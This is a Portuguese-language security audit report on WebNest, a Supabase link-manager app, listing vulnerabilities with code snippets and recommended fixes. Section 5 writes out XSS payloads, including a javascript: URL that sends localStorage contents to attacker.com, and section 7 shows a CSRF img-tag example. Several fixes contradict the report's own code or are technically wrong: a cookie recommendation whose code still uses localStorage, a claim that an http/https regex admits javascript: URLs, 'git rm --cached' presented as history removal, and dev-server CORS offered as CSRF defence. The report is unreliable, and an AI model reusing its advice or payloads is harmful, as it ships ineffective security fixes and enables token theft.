# 🔒 Relatório de Auditoria de Segurança - WebNest

**Data:** 15 de Fevereiro de 2026  
**Status:** ⚠️ VULNERABILIDADES CRÍTICAS ENCONTRADAS  
**Severidade Overall:** 🔴 CRÍTICA

---

## 📋 Sumário Executivo

O projeto WebNest implementa um gerenciador de links com autenticação Supabase. Durante a auditoria, foram identificadas **5 vulnerabilidades críticas**, **3 de alto risco** e **4 de médio risco** que precisam ser corrigidas imediatamente antes do deployment em produção.

---

## 🚨 VULNERABILIDADES CRÍTICAS

### 1. **Credenciais de Supabase Expostas no Repositório** ⛔ CRÍTICO
**Arquivo:** `.env`  
**Severidade:** 🔴 CRÍTICA

#### ❌ Problema Identificado:
```dotenv
VITE_SUPABASE_PROJECT_ID="slzspaijayxtyjmrogcm"
VITE_SUPABASE_PUBLISHABLE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
VITE_SUPABASE_URL="https://slzspaijayxtyjmrogcm.supabase.co"
```

- O arquivo `.env` **NÃO está no `.gitignore`** (verificado em `.gitignore`)
- **Chaves Supabase públicas estão expostas**
- Project ID pode ser usado para identificar seu banco de dados
- JWT Token Anon Key pode ser usado para acessar dados (dependendo de RLS)

#### ✅ Recomendação:
1. **IMEDIATO**: Revoke a chave atual no painel Supabase
2. Gerar uma nova chave
3. Adicionar `.env` ao `.gitignore`:
```ignore
# Environment variables
.env
.env.local
.env.*.local
.env.prod
```
4. Usar `.env.example` com valores placeholder:
```dotenv
# Copy from .env.example and fill with your values
VITE_SUPABASE_PROJECT_ID=
VITE_SUPABASE_PUBLISHABLE_KEY=
VITE_SUPABASE_URL=
```
5. Notificar Supabase que a chave foi comprometida

---

### 2. **Políticas RLS Inicialmente Abertas a Todos** ⛔ CRÍTICO
**Arquivo:** `supabase/migrations/20260214162247...sql`  
**Severidade:** 🔴 CRÍTICA

#### ❌ Problema na Primeira Migração:
```sql
-- ❌ INSEGURO - Permite acesso público TOTAL
CREATE POLICY "Allow all access to links" ON public.links FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Allow all access to categories" ON public.categories FOR ALL USING (true) WITH CHECK (true);
```

#### ✅ Status da Segunda Migração:
✅ A segunda migração corrigiu isso corretamente com RLS baseado em `auth.uid()`:
```sql
CREATE POLICY "Users can view their own links"
  ON public.links FOR SELECT
  USING (auth.uid() = user_id);
```

**Mas:** Se alguém usar a chave comprometida contra o banco ANTES de aplicar a segunda migração, terá acesso total a TODOS os links de TODOS os usuários.

---

### 3. **Falta de .env no .gitignore** ⛔ CRÍTICO
**Severidade:** 🔴 CRÍTICA

O arquivo `.gitignore` não contém:
```ignore
.env            # ← FALTA
.env.local
.env.*.local
```

#### ✅ Ação Imediata:
Se você já fez commit do `.env`, use:
```bash
# Remover do histórico git (⚠️ apenas em dev local)
git rm --cached .env
git commit -m "Remove exposed .env file"
```

---

## 🔴 VULNERABILIDADES DE ALTO RISCO

### 4. **Armazenamento de Sessão no localStorage** 
**Arquivo:** `src/integrations/supabase/client.ts`  
**Severidade:** 🟠 ALTO

#### ❌ Problema:
```typescript
const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    storage: localStorage,        // ← Vulnerável a XSS
    persistSession: true,
    autoRefreshToken: true,
  }
});
```

- localStorage é **acessível via JavaScript** (vulnerável a XSS attacks)
- Se um atacante injetar JavaScript, pode roubar o token
- Tokens podem ser usados para acessar dados do usuário

#### ✅ Recomendação:
Use cookies com flag `httpOnly` e `Secure`:
```typescript
import { createClient } from '@supabase/supabase-js';

export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    storage: {
      getItem: (key) => {
        if (typeof window === 'undefined') return null;
        return window.localStorage.getItem(key);
      },
      setItem: (key, value) => {
        if (typeof window === 'undefined') return;
        window.localStorage.setItem(key, value);
      },
      removeItem: (key) => {
        if (typeof window === 'undefined') return;
        window.localStorage.removeItem(key);
      },
    },
    flowType: 'pkce',  // ← Use PKCE flow (mais seguro)
    autoRefreshToken: true,
    persistSession: true,
    detectSessionInUrl: true,
  }
});
```

---

### 5. **Falta de Validação de URLs Maliciosas** 
**Arquivo:** `src/lib/validation.ts` e `src/components/LinkCard.tsx`  
**Severidade:** 🟠 ALTO

#### ❌ Problema:
A validação de URL permite qualquer protocolo http/https:
```typescript
url: z.string().url("URL inválida").refine(
  (url) => /^https?:\/\//i.test(url),
  "Apenas URLs http/https são permitidas"
)
```

**Risco:** Usuários podem salvar URLs maliciosas:
- `javascript:alert('XSS')`
- `data:text/html,<script>alert('XSS')</script>`
- `javascript:fetch('https://attacker.com?stolen=' + btoa(localStorage))`

Embora haja proteção no LinkCard (`target="_blank" rel="noopener noreferrer"`), não é suficiente.

#### ✅ Recomendação:
```typescript
import { z } from "zod";

// Whitelist de protocolos seguros
const ALLOWED_PROTOCOLS = ['http://', 'https://', 'mailto:', 'ftp://'];

export const linkSchema = z.object({
  url: z.string()
    .url("URL inválida")
    .max(2048, "URL muito longa")
    .refine(
      (url) => {
        try {
          const urlObj = new URL(url);
          return ALLOWED_PROTOCOLS.some(proto => url.startsWith(proto));
        } catch {
          return false;
        }
      },
      "URL com protocolo inválido"
    )
    .refine(
      (url) => !url.includes('javascript:') && !url.includes('data:'),
      "URLs maliciosas não permitidas"
    ),
  // ... resto do schema
});
```

---

### 6. **Falta de Content Security Policy (CSP)** 
**Arquivo:** `index.html`  
**Severidade:** 🟠 ALTO

#### ❌ Problema:
Não há CSP header definido, deixando a aplicação vulnerável a:
- Injeção de scripts maliciosos
- Roubo de dados via eventos do navegador
- Carregamento de recursos não autorizados

#### ✅ Recomendação:
Adicionar a `index.html`:
```html
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <!-- Adicionar CSP -->
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'wasm-unsafe-eval';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' data:;
    connect-src 'self' https://slzspaijayxtyjmrogcm.supabase.co;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self'
  ">
  <title>WebNest</title>
</head>
```

Para melhor segurança, usar header HTTP (em vez de meta tag).

---

## 🟠 VULNERABILIDADES DE MÉDIO RISCO

### 7. **Falta de CSRF Protection**
**Severidade:** 🟡 MÉDIO

#### ❌ Problema:
Sem headers CSRF, um site malicioso poderia:
```html
<!-- Em site-malicioso.com -->
<img src="https://seu-app.com/api/delete-link?id=123" >
```

#### ✅ Recomendação:
- Usar SameSite cookies
- Implementar CSRF tokens para formulários
- Supabase gerencia alguns aspectos, mas adicionar camada extra:

```typescript
// No Vite config
defineConfig({
  server: {
    host: "::",
    port: 8080,
    // Adicionar
    cors: {
      origin: process.env.VITE_APP_URL || 'http://localhost:8080',
      credentials: true,
      methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
    },
  }
})
```

---

### 8. **Favicon URLs de Terceiros sem Validação**
**Arquivo:** `src/components/LinkCard.tsx` e `src/components/LinkForm.tsx`  
**Severidade:** 🟡 MÉDIO

#### ❌ Problema:
```typescript
// LinkForm.tsx
const hostname = new URL(url).hostname;
setFavicon(`https://www.google.com/s2/favicons?domain=${hostname}&sz=32`);
```

- Google pode rastrear cada favicon requisitado
- Favicon URL pode ser explorado se não for validado

#### ✅ Recomendação:
```typescript
// Usar alternativa mais privada
const hostname = new URL(url).hostname;
// Opção 1: Usar cache local
setFavicon(`/favicons/${encodeURIComponent(hostname)}.png`);

// Opção 2: Usar serviço mais privado com fallback
const faviconUrl = `https://icon.horse/icon/${hostname}`;

// Opção 3: Apenas armazenar no backend após download
```

---

### 9. **Falta de Validação de Upload de Arquivo (Import)**
**Arquivo:** `src/pages/Index.tsx`  
**Severidade:** 🟡 MÉDIO

#### ❌ Problema:
```typescript
const handleImport = () => {
  const input = document.createElement("input");
  input.type = "file";
  input.accept = ".json";
  input.onchange = async (e) => {
    const file = (e.target as HTMLInputElement).files?.[0];
    if (!file) return;
    try {
      const text = await file.text();
      const imported = JSON.parse(text);  // ← Sem validação do tamanho
      // ...
    }
  }
}
```

- Sem limites de tamanho de arquivo
- Sem validação de estrutura antes de processar
- Poderia causar DoS com arquivo gigante

#### ✅ Recomendação:
```typescript
const handleImport = () => {
  const input = document.createElement("input");
  input.type = "file";
  input.accept = ".json";
  
  input.onchange = async (e) => {
    const file = (e.target as HTMLInputElement).files?.[0];
    if (!file) return;
    
    // Validações
    const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
    if (file.size > MAX_FILE_SIZE) {
      toast.error("Arquivo muito grande (máx 5MB)");
      return;
    }
    
    try {
      const text = await file.text();
      let imported: LinkItem[];
      
      try {
        imported = JSON.parse(text);
      } catch (e) {
        toast.error("JSON inválido");
        return;
      }
      
      // Validar estrutura
      if (!Array.isArray(imported)) {
        toast.error("Deve ser um array de links");
        return;
      }
      
      // Limitar quantidade
      if (imported.length > 1000) {
        toast.error("Máximo de 1000 links por importação");
        return;
      }
      
      // Processar com validação individual
      for (const item of imported) {
        const validated = linkSchema.safeParse(item);
        if (!validated.success) continue;
        
        await addLink(validated.data);
      }
    } catch (e) {
      toast.error("Erro ao processar arquivo");
    }
  };
  
  input.click();
};
```

---

## 🟢 PONTOS POSITIVOS ENCONTRADOS ✅

### 10. **RLS Corretamente Implementado na Migração Final** ✅
```sql
CREATE POLICY "Users can view their own links"
  ON public.links FOR SELECT
  USING (auth.uid() = user_id);
```

**Bom:** Políticas de Row-Level Security isolam dados por usuário.

---

### 11. **Validação de Input com Zod** ✅
```typescript
export const linkSchema = z.object({
  url: z.string().url("URL inválida").max(2048, "..."),
  title: z.string().max(255, "..."),
  // ...
});
```

**Bom:** Validação em tempo de execução dos dados de entrada.

---

### 12. **Proteção de Links Externos** ✅
```typescript
<a
  href={link.url}
  target="_blank"
  rel="noopener noreferrer"  // ← Bom!
  className="..."
>
```

**Bom:** `rel="noopener noreferrer"` previne que o site aberto acesse `window.opener`.

---

### 13. **Sem `dangerouslySetInnerHTML`** ✅
O projeto não usa `dangerouslySetInnerHTML` ou `innerHTML`, prevenindo injeção de HTML/XSS direto no DOM.

---

### 14. **TypeScript** ✅
Uso de TypeScript adiciona uma camada de type safety que previne certas classes de bugs.

---

## 📊 Tabela de Resumo de Vulnerabilidades

| # | Tipo | Severidade | Status | Ação |
|---|------|-----------|--------|------|
| 1 | Credenciais Expostas | 🔴 CRÍTICA | ❌ Ativo | Revoke chave + Add .env ao gitignore |
| 2 | RLS Aberto (1ª Migração) | 🔴 CRÍTICA | ⚠️ Parcial | Verificar se 2ª migração foi aplicada |
| 3 | .env no Repositório | 🔴 CRÍTICA | ❌ Ativo | Remove git history + adicionar gitignore |
| 4 | localStorage XSS | 🟠 ALTO | ❌ Ativo | Implementar PKCE + encrypted storage |
| 5 | URLs Maliciosas | 🟠 ALTO | ⚠️ Parcial | Whitelist protocols + sanitize |
| 6 | Falta de CSP | 🟠 ALTO | ❌ Ativo | Adicionar headers CSP |
| 7 | Falta de CSRF | 🟡 MÉDIO | ❌ Ativo | Implementar SameSite + CSRF tokens |
| 8 | Favicon Tracking | 🟡 MÉDIO | ⚠️ Parcial | Usar serviço mais privado |
| 9 | Validação Import | 🟡 MÉDIO | ❌ Ativo | Adicionar limits e validação |

---

## 🚀 Plano de Ação Corretivo

### 🔴 Fase 1: CRÍTICA (Hoje - 24 horas)
- [ ] Revogar chaves Supabase atuais no console
- [ ] Gerar novas chaves
- [ ] Remover `.env` do git history
- [ ] Adicionar `.env` ao `.gitignore`
- [ ] Fazer novo commit

### 🟠 Fase 2: ALTO RISCO (Próximos 3 dias)
- [ ] Implementar CSP headers
- [ ] Adicionar validação de URLs maliciosas
- [ ] Migrar para PKCE flow
- [ ] Adicionar validação de upload de arquivo

### 🟡 Fase 3: MÉDIO RISCO (Próxima semana)
- [ ] Implementar CSRF protection
- [ ] Melhorar privacidade de favicon
- [ ] Adicionar logging e monitoramento de segurança
- [ ] Implementar rate limiting

---

## 📚 Recursos Recomendados

- [OWASP Top 10](https://owasp.org/Top10/)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/auth)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [React Security Best Practices](https://snyk.io/blog/10-react-security-best-practices/)

---

## 📝 Notas Finais

Este é um projeto interessante. A segunda migração mostra esforço em melhorar a segurança, mas as vulnerabilidades críticas relacionadas a credenciais precisam de ação imediata.

**Recomendação:** Não fazer deploy em produção sem resolver os itens da Fase 1.

---

**Auditoria realizada em:** 15 de Fevereiro de 2026
